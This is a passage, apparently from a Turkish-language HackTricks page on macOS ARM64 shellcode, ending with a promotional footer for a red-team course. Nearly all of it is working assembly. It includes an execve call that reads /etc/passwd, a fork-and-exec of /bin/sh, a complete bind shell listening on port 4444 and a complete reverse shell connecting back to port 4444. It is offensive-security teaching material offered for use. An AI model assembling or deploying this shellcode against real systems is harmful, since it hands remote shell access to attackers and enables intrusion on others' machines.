mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Ana işlem öldürülmediği için bir çataldan sh ile komut çağırma

Bir çataldan sh kullanarak komut çağırmak, ana işlemin öldürülmediği anlamına gelir.
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bağlama kabuğu

Bağlama kabuğu [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) adresindeki **4444 numaralı port** üzerinden alınır.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Ters kabuk

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) adresinden **127.0.0.1:4444**'e ters kabuk (revshell) alın.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'a göz atın!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
